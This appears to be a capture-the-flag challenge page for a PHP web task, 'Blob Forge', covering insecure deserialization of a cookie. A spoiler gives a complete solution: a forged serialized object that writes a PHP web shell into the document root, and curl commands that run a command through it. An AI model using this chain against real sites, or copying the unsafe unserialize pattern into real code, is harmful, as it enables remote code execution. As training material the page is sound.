# w19 :: Blob Forge

- **Category:** Web
- **Difficulty:** medium
- **Stack:** PHP 8.3 / Apache
- **URL:** http://localhost:30019

## Brief

BLOB FORGE stores your shop preferences in a single cookie called `prefs`. To
keep old backups readable it still decodes that cookie with PHP's **legacy
serializer**, then reflects the result back to you at `/api/prefs` so you can
see exactly what it understood.

The preference objects it can rebuild are not inert data. One of them,
`PreferenceCache`, persists itself when the request ends, writing its `content`
to its `path`. Both fields come off the wire.

The document root is writable by the web user, because the cache is supposed to
land next to the app.

## Goal

Turn the cookie into an arbitrary file write, drop a file the server will
execute, and read the flag out of the process that is running it.

## Hint

`base64_decode` then `unserialize`, with nothing in between. You are not
limited to the objects a *normal* client would send — only to the classes the
application happens to have autoloaded when the cookie is decoded.

Read `app/classes.php` logic through the reflection endpoint: send a blob,
watch what `/api/prefs` says it decoded. The serializer names the class on the
wire (`O:15:"PreferenceCache":...`), and the class rebuild happens whatever the
intended client was doing.

Two fields are load-bearing and one is a guard. An empty `content`, or a `ttl`
of `0`, and the write is silently skipped.

<details>
<summary>Spoiler</summary>

The cookie is decoded by:

```php
$prefs = @unserialize(base64_decode($raw, true));
```

and the class it can rebuild writes attacker-chosen bytes to an
attacker-chosen path:

```php
public function __destruct()
{
    if (strlen($this->content) === 0) { return; }
    if ($this->ttl === 0) { return; }
    @file_put_contents($this->path, $this->content);
}
```

So serialize a `PreferenceCache` with `path = /shell.php`,
`content = <?php system($_GET["x"]); ?>` and `ttl = 3600`, base64 it, and set it
as `prefs`. `/shell.php` is inside the document root, which `www-data` owns, so
the write lands and Apache serves it.

```bash
PAYLOAD=$(php solution/payload.php -p /shell.php -c '<?php system($_GET["x"]); ?>')
curl -s -o /dev/null -b "prefs=$PAYLOAD" http://localhost:30019/api/prefs
curl -s --get --data-urlencode 'x=printenv W0B_FLAG' http://localhost:30019/shell.php
# hex4b0t{...}
```

The flag is in the container environment (`W0B_FLAG`), never served as a file,
so you need the code execution — not just the file write — to get it.

`solution/probe.sh` asserts the benign round-trip, that no shipped route leaks
the flag, and that the forged blob gets the flag out end to end.

</details>
